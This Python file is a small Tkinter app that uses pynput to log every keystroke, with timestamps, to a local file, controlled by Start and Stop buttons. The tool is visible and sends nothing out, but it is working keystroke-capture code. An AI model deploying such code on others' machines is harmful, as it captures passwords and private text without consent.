# This script requires 'pynput'. Install with: pip install pynput
import tkinter as tk
from tkinter import messagebox
from pynput.keyboard import Key, Listener
import logging
import threading

# --- Basic Setup ---
log_file = "keylog.txt"
logging.basicConfig(
    filename=log_file,
    level=logging.DEBUG,
    format='%(asctime)s: %(message)s'
)

class KeyloggerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger Control")
        self.listener = None
        self.is_running = False

        # --- GUI Elements ---
        self.status_label = tk.Label(root, text="Status: Stopped", font=("Arial", 12), fg="red")
        self.status_label.pack(pady=10)

        self.start_button = tk.Button(root, text="Start Logging", command=self.start_listener, width=20)
        self.start_button.pack(pady=5)

        self.stop_button = tk.Button(root, text="Stop Logging", command=self.stop_listener, width=20, state=tk.DISABLED)
        self.stop_button.pack(pady=5)
        
        # Ensure the listener stops when the window is closed
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)

    # --- Key Handlers ---
    def on_press(self, key):
        try:
            logging.info(f"Key pressed: {key.char}")
        except AttributeError:
            key_str = str(key)
            if key == Key.space:
                key_str = "Space"
            elif key == Key.enter:
                key_str = "Enter\n"
            logging.info(f"Special key pressed: {key_str}")

    def on_release(self, key):
        pass

    # --- Control Functions ---
    def start_listener(self):
        if not self.is_running:
            self.is_running = True
            self.listener = Listener(on_press=self.on_press, on_release=self.on_release)
            # Run the listener in a separate thread to prevent GUI from freezing
            self.listener_thread = threading.Thread(target=self.listener.start)
            self.listener_thread.start()

            # Update GUI
            self.status_label.config(text="Status: Running", fg="green")
            self.start_button.config(state=tk.DISABLED)
            self.stop_button.config(state=tk.NORMAL)
            logging.info("--- Keylogger started ---")

    def stop_listener(self):
        if self.is_running:
            self.is_running = False
            if self.listener:
                self.listener.stop()
            
            # Update GUI
            self.status_label.config(text="Status: Stopped", fg="red")
            self.start_button.config(state=tk.NORMAL)
            self.stop_button.config(state=tk.DISABLED)
            logging.info("--- Keylogger stopped ---")

    def on_closing(self):
        self.stop_listener()
        self.root.destroy()

# --- Main Program Execution ---
if __name__ == "__main__":
    root = tk.Tk()
    app = KeyloggerApp(root)
    root.mainloop()
